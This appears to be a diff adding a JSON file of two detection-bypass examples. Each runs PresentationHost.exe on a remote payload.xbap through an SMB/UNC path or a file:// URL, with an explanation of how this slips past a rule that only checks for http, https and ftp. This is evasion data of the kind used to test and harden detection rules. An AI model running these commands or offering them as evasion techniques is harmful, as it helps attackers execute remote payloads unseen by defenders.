@@ -1,0 +1,10 @@
+[
+  {
+    "output": "PresentationHost.exe \\\\192.168.1.50\\share\\payload.xbap",
+    "explanation": "Bypasses the selection_cli condition by utilizing an SMB/UNC path to host and execute the remote file. The rule explicitly looks for http://, https://, or ftp://, so SMB paths are completely ignored."
+  },
+  {
+    "output": "PresentationHost.exe file://192.168.1.50/share/payload.xbap",
+    "explanation": "Bypasses the selection_cli condition by utilizing the file:// protocol handler instead of the explicitly listed web/FTP handlers to point to a remote payload."
+  }
+]
